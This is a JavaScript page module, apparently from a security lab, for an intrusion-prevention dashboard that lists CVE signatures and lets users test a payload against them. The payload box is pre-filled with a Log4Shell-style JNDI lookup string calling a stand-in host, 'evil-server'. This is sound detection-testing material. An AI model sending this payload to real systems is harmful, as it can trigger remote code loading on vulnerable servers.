Lab.registerPage('ips', {
  async render(container) {
    const body = Lab.renderLayout(container, { title: 'Intrusion Prevention (IPS)', route: 'ips' });
    body.innerHTML = '';

    body.appendChild(Lab.el('h3', {}, 'Signature database'));
    const sigBox = Lab.el('div', {});
    async function refresh() {
      const { 'ips-signatures': rows } = await Lab.fetchJSON('/api/ips/ips-signatures');
      sigBox.innerHTML = '';
      sigBox.appendChild(Lab.el('table', { class: 'data-table' }, [
        Lab.el('tr', {}, [Lab.el('th', {}, 'CVE'), Lab.el('th', {}, 'Name'), Lab.el('th', {}, 'Severity'), Lab.el('th', {}, 'Action')]),
        ...rows.map((s) => Lab.el('tr', {}, [Lab.el('td', {}, s.cveId), Lab.el('td', {}, s.name), Lab.el('td', {}, Lab.el('span', { class: `badge ${s.severity}` }, s.severity)), Lab.el('td', {}, s.action)])),
      ]));
    }
    refresh();
    body.appendChild(sigBox);
    body.appendChild(Lab.el('hr', { class: 'sep' }));

    body.appendChild(Lab.el('h3', {}, 'Test a payload'));
    const payload = Lab.el('textarea', {}, '${jndi:ldap://evil-server/a}');
    body.appendChild(payload);
    const output = Lab.el('div', {});
    body.appendChild(Lab.el('button', {
      onclick: async () => {
        const result = await Lab.fetchJSON('/api/ips/match', { method: 'POST', body: { payloadSignature: payload.value } });
        output.innerHTML = '';
        output.appendChild(result.matched
          ? Lab.el('p', {}, [Lab.el('span', { class: `badge ${result.signature.severity}` }, 'matched'), ` ${result.signature.name} (${result.signature.cveId}) -- action: ${result.signature.action}`])
          : Lab.el('p', { class: 'muted' }, 'No known signature matched.'));
      },
    }, 'Test'));
    body.appendChild(output);
  },
});
